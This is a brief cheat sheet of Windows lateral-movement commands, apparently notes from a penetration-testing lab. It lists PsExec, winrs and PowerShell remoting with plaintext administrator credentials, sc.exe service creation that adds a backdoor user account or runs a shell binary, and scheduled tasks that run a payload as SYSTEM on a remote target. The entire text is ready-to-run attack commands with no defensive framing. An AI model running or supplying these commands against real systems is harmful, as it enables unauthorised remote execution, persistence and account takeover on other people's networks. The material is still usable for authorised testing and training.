# Processes
Spawn processes remotely to interact with other machines

## Psexec
* psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

## Winrm
* winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
* $username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
* Enter-PSSession -Computername TARGET -Credential $credential
* Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

## sc
### Create a service
* sc.exe \\TARGET create Myservice binPath= "net user munra Pass123 /add" start= auto
* sc.exe \\otro.domain.com create SERVICIO_PERRON binPath= "%windir%\shell.exe" start= auto
* sc.exe \\TARGET start Myservice
* sc.exe \\TARGET stop THMservice
* sc.exe \\TARGET delete THMservice

## SCHTASK
* schtasks /s TARGET /RU "SYSTEM" /create /tn "Mytask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
* schtasks /s TARGET /run /TN "Mytask1"
* schtasks /S TARGET /TN "Mytask1" /DELETE /F
